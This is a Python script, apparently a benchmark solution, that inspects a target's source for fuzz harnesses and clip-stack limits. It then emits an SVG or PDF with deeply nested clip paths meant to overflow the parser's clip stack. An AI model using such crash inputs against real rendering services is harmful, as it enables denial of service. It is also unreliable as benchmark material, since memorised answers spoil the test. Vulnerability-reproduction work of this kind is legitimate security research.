import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


def _is_code_file(name: str) -> bool:
    name = name.lower()
    return name.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh', '.hxx', '.m', '.mm'))


def _safe_read_tar_member(tar: tarfile.TarFile, m: tarfile.TarInfo, max_bytes: int = 2_000_000) -> bytes:
    try:
        f = tar.extractfile(m)
        if f is None:
            return b""
        with f:
            return f.read(max_bytes)
    except Exception:
        return b""


def _safe_read_file(path: str, max_bytes: int = 2_000_000) -> bytes:
    try:
        with open(path, "rb") as f:
            return f.read(max_bytes)
    except Exception:
        return b""


def _iter_dir_files(root: str) -> Iterable[Tuple[str, int]]:
    for base, _, files in os.walk(root):
        for fn in files:
            p = os.path.join(base, fn)
            try:
                st = os.stat(p)
                yield p, st.st_size
            except Exception:
                continue


def _analyze_text_for_format_scores(b: bytes) -> Dict[str, int]:
    lb = b.lower()
    scores = {"svg": 0, "pdf": 0, "skp": 0, "json": 0}

    if b"llvmfuzzertestoneinput" in lb:
        scores["svg"] += 5
        scores["pdf"] += 5
        scores["skp"] += 5
        scores["json"] += 2

    svg_markers = [
        b"<svg",
        b"sksvg",
        b"svgdom",
        b"svg",
        b"clip-path",
        b"clippath",
        b"xmlns=\"http://www.w3.org/2000/svg\"",
        b"rsvg",
        b"librsvg",
        b"resvg",
        b"nanosvg",
    ]
    pdf_markers = [
        b"%pdf",
        b" pdf",
        b"poppler",
        b"pdfium",
        b"mupdf",
        b"fitz",
        b"xref",
        b"startxref",
        b"/catalog",
        b"/pages",
        b"/page",
        b"pdfdoc",
        b"pdf_document",
    ]
    skp_markers = [
        b"skpicture",
        b"makefromstream",
        b"skp",
        b".skp",
        b"skserial",
        b"deserialize",
        b"skp_fuzzer",
        b"picture_fuzzer",
    ]
    json_markers = [
        b"json",
        b"lottie",
        b"skottie",
        b"rapidjson",
        b"nlohmann",
    ]

    for mk in svg_markers:
        if mk in lb:
            scores["svg"] += 2
    for mk in pdf_markers:
        if mk in lb:
            scores["pdf"] += 2
    for mk in skp_markers:
        if mk in lb:
            scores["skp"] += 2
    for mk in json_markers:
        if mk in lb:
            scores["json"] += 1

    return scores


def _score_from_name(name: str) -> Dict[str, int]:
    n = name.lower()
    scores = {"svg": 0, "pdf": 0, "skp": 0, "json": 0}

    if "svg" in n:
        scores["svg"] += 2
    if n.endswith(".svg") or n.endswith(".svgz"):
        scores["svg"] += 4
    if "pdf" in n:
        scores["pdf"] += 2
    if n.endswith(".pdf"):
        scores["pdf"] += 4
    if "poppler" in n or "pdfium" in n or "mupdf" in n or "/fitz" in n:
        scores["pdf"] += 4
    if "skp" in n or n.endswith(".skp"):
        scores["skp"] += 4
    if "picture" in n and "fuzz" in n:
        scores["skp"] += 2
    if "lottie" in n or "skottie" in n:
        scores["json"] += 3
    if n.endswith(".json"):
        scores["json"] += 2
    if "fuzz" in n or "fuzzer" in n:
        scores["svg"] += 1
        scores["pdf"] += 1
        scores["skp"] += 1
        scores["json"] += 1
    return scores


def _extract_depth_candidates_from_text(text: str) -> List[Tuple[int, int]]:
    res: List[Tuple[int, int]] = []

    patterns = [
        r'^\s*#\s*define\s+([A-Za-z0-9_]*?(?:CLIP|Clip|clip).*?(?:STACK|Stack|stack|DEPTH|Depth|depth|NEST|Nest|nest).*?)\s+(\d{2,7})\b',
        r'\b(static\s+)?(const|constexpr)\s+(?:int|unsigned|size_t|uint32_t|uint16_t|uint64_t)\s+([A-Za-z0-9_]*?(?:CLIP|Clip|clip).*?(?:STACK|Stack|stack|DEPTH|Depth|depth|NEST|Nest|nest).*?)\s*=\s*(\d{2,7})\b',
        r'\b(kMax[A-Za-z0-9_]*?(?:Clip|clip|CLIP)[A-Za-z0-9_]*?(?:Stack|stack|STACK|Depth|depth|DEPTH|Nesting|nesting|NESTING)[A-Za-z0-9_]*)\s*=\s*(\d{2,7})\b',
        r'\b(MAX_[A-Za-z0-9_]*?(?:CLIP|Clip|clip).*?(?:STACK|Stack|stack|DEPTH|Depth|depth|NEST|Nest|nest)[A-Za-z0-9_]*)\s*=\s*(\d{2,7})\b',
        r'\b(MAX_[A-Za-z0-9_]*?(?:CLIP|Clip|clip).*?(?:STACK|Stack|stack|DEPTH|Depth|depth|NEST|Nest|nest)[A-Za-z0-9_]*)\s+(\d{2,7})\b',
    ]

    for pat in patterns:
        for m in re.finditer(pat, text, flags=re.MULTILINE):
            nums = [g for g in m.groups() if g and g.isdigit()]
            if not nums:
                continue
            try:
                v = int(nums[-1])
            except Exception:
                continue
            if 8 <= v <= 2_000_000:
                weight = 8
                res.append((weight, v))

    for line in text.splitlines():
        low = line.lower()
        w = 0
        if "clip" in low and "mark" in low:
            w += 8
        if "layer" in low and "clip" in low and "stack" in low:
            w += 8
        if "clip" in low and "stack" in low:
            w += 6
        if "nest" in low and "depth" in low:
            w += 6
        elif "nest" in low:
            w += 4
        if "depth" in low:
            w += 2
        if w <= 0:
            continue

        for num in re.findall(r"\b(\d{2,7})\b", line):
            try:
                v = int(num)
            except Exception:
                continue
            if 8 <= v <= 2_000_000:
                res.append((w, v))

    return res


def _estimate_stack_depth_from_texts(texts: List[str]) -> Optional[int]:
    cands: List[Tuple[int, int]] = []
    for t in texts:
        cands.extend(_extract_depth_candidates_from_text(t))

    if not cands:
        return None

    cands.sort(key=lambda x: (x[0], x[1]), reverse=True)
    top_w = cands[0][0]
    top = [v for w, v in cands if w >= max(6, top_w - 1)]

    filtered = [v for v in top if 16 <= v <= 500_000]
    if filtered:
        filtered.sort()
        return filtered[-1]
    return cands[0][1]


def _build_svg(depth: int) -> bytes:
    header = b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><defs><clipPath id="a"><rect width="1" height="1"/></clipPath></defs>'
    open_tag = b'<g clip-path="url(#a)">'
    close_tag = b'</g>'
    body = open_tag * depth + b'<rect width="1" height="1"/>' + close_tag * depth
    footer = b'</svg>'
    return header + body + footer


def _build_pdf(depth: int) -> bytes:
    op = b"0 0 1 1 re W n\n"
    content = op * depth
    if not content.endswith(b"\n"):
        content += b"\n"

    obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] /Resources << >> /Contents 4 0 R >>\nendobj\n"
    obj4 = (b"4 0 obj\n<< /Length " + str(len(content)).encode("ascii") + b" >>\nstream\n" +
            content + b"endstream\nendobj\n")

    header = b"%PDF-1.4\n%\xFF\xFF\xFF\xFF\n"
    parts = [header]
    offsets = [0]
    pos = len(header)

    for obj in (obj1, obj2, obj3, obj4):
        offsets.append(pos)
        parts.append(obj)
        pos += len(obj)

    xref_pos = pos
    n_objs = 4
    xref = [b"xref\n0 " + str(n_objs + 1).encode("ascii") + b"\n"]
    xref.append(b"0000000000 65535 f \n")
    for off in offsets[1:]:
        xref.append(f"{off:010d} 00000 n \n".encode("ascii"))

    trailer = (
        b"trailer\n<< /Size " + str(n_objs + 1).encode("ascii") +
        b" /Root 1 0 R >>\nstartxref\n" + str(xref_pos).encode("ascii") + b"\n%%EOF\n"
    )

    parts.extend(xref)
    parts.append(trailer)
    return b"".join(parts)


class Solution:
    def solve(self, src_path: str) -> bytes:
        name_scores = {"svg": 0, "pdf": 0, "skp": 0, "json": 0}
        harness_texts: List[str] = []
        clip_related_texts: List[str] = []

        def accumulate_scores(sc: Dict[str, int]) -> None:
            for k, v in sc.items():
                name_scores[k] = name_scores.get(k, 0) + int(v)

        if os.path.isdir(src_path):
            candidates: List[Tuple[str, int]] = []
            for p, sz in _iter_dir_files(src_path):
                lp = p.lower()
                accumulate_scores(_score_from_name(lp))
                if _is_code_file(lp) and sz <= 5_000_000:
                    if ("fuzz" in lp or "fuzzer" in lp or "oss-fuzz" in lp or "ossfuzz" in lp or
                        ("clip" in lp and ("stack" in lp or "layer" in lp or "pdf" in lp or "device" in lp)) or
                        ("layerclip" in lp) or ("clipstack" in lp) or ("clip_mark" in lp) or
                        ("pdf" in lp and ("device" in lp or "clip" in lp))):
                        candidates.append((p, sz))

            candidates.sort(key=lambda x: x[1])
            for p, _ in candidates[:300]:
                b = _safe_read_file(p, 2_000_000)
                if not b:
                    continue
                if b"LLVMFuzzerTestOneInput" in b or b"LLVMFuzzerTestOneInput".lower() in b.lower():
                    try:
                        txt = b.decode("utf-8", errors="ignore")
                    except Exception:
                        txt = b.decode("latin1", errors="ignore")
                    harness_texts.append(txt)
                if (b"clip" in b.lower() and (b"stack" in b.lower() or b"mark" in b.lower() or b"nest" in b.lower())) or (b"layer" in b.lower() and b"clip" in b.lower()):
                    try:
                        txt = b.decode("utf-8", errors="ignore")
                    except Exception:
                        txt = b.decode("latin1", errors="ignore")
                    clip_related_texts.append(txt)
                accumulate_scores(_analyze_text_for_format_scores(b))
        else:
            with tarfile.open(src_path, "r:*") as tar:
                members = [m for m in tar.getmembers() if m.isfile()]
                for m in members:
                    accumulate_scores(_score_from_name(m.name))

                candidate_members: List[tarfile.TarInfo] = []
                for m in members:
                    nm = m.name.lower()
                    if not _is_code_file(nm):
                        continue
                    if m.size > 5_000_000:
                        continue
                    if ("fuzz" in nm or "fuzzer" in nm or "oss-fuzz" in nm or "ossfuzz" in nm or
                        ("clip" in nm and ("stack" in nm or "layer" in nm or "pdf" in nm or "device" in nm)) or
                        ("layerclip" in nm) or ("clipstack" in nm) or ("clip_mark" in nm) or
                        ("pdf" in nm and ("device" in nm or "clip" in nm))):
                        candidate_members.append(m)

                candidate_members.sort(key=lambda x: x.size)
                for m in candidate_members[:350]:
                    b = _safe_read_tar_member(tar, m, 2_000_000)
                    if not b:
                        continue
                    lb = b.lower()
                    if b"llvmfuzzertestoneinput" in lb:
                        try:
                            txt = b.decode("utf-8", errors="ignore")
                        except Exception:
                            txt = b.decode("latin1", errors="ignore")
                        harness_texts.append(txt)
                    if (b"clip" in lb and (b"stack" in lb or b"mark" in lb or b"nest" in lb)) or (b"layer" in lb and b"clip" in lb):
                        try:
                            txt = b.decode("utf-8", errors="ignore")
                        except Exception:
                            txt = b.decode("latin1", errors="ignore")
                        clip_related_texts.append(txt)
                    accumulate_scores(_analyze_text_for_format_scores(b))

        fmt = max(name_scores.items(), key=lambda kv: kv[1])[0]
        if fmt == "json":
            fmt = "svg" if name_scores.get("svg", 0) >= name_scores.get("pdf", 0) else "pdf"
        if fmt == "skp":
            fmt = "svg" if name_scores.get("svg", 0) >= name_scores.get("pdf", 0) else "pdf"

        depth_est = _estimate_stack_depth_from_texts(clip_related_texts + harness_texts)

        if fmt == "svg":
            base = 50_000
        else:
            base = 80_000

        if depth_est is None:
            depth = base
        else:
            extra = max(16, min(1024, depth_est // 32))
            depth = max(base, depth_est + extra)

        depth = max(64, min(depth, 200_000))

        if fmt == "pdf":
            return _build_pdf(depth)
        return _build_svg(depth)